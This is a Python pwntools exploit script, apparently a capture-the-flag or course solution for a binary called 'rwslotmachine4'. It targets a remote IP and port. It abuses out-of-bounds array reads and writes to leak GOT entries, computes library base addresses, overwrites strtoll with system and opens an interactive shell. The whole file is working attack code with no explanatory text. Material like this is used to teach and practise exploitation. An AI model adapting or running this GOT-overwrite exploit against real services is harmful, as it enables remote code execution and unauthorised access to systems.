from pwn import *

libc = ELF("../src/libc.so.6")
libint = ELF("../src/libint.so")

local = False

if local:
	p = process('../src/rwslotmachine4', env={'LD_LIBRARY_PATH' : '.'})
	binary = p.elf
else:
	p = remote('141.85.224.117', 31347)
	binary = ELF('../src/rwslotmachine4')

def do_read(idx):
	p.recvuntil('>')
	p.sendline('1')
	p.recvuntil('index:')
	p.sendline(str(idx))
	p.recvuntil(']: ')
	return int(p.recvuntil('\n')[:-1], 16)

def do_write(idx, value):
	p.recvuntil('>')
	p.sendline('2')
	p.recvuntil('index:')
	p.sendline(str(idx))
	p.recvuntil('value:')
	p.sendline(hex(value))

slots_offset = binary.symbols['slots']
puts_got_offset = binary.got['puts']
readint_got_offset = binary.got['read_int']

index_to_puts = (puts_got_offset - slots_offset) / 4
index_to_readint = (readint_got_offset - slots_offset) / 4

# leak puts@got and calculate libc base
libc_leak = do_read(index_to_puts)
libc_base = libc_leak - libc.symbols["puts"]
system = libc_base + libc.symbols["system"]

# leak read_int@got and calculate libint base
libint_leak = do_read(index_to_readint)
libint_base = libint_leak - libint.symbols["read_int"]

# overwrite strtoll in the GOT of libint
libint_strtoll_got_offset = libint.got['strtoll']
index_to_libint_strtoll = (libint_base + libint_strtoll_got_offset - slots_offset) / 4

do_write(index_to_libint_strtoll, system)
p.sendline('/bin/sh')

p.interactive()
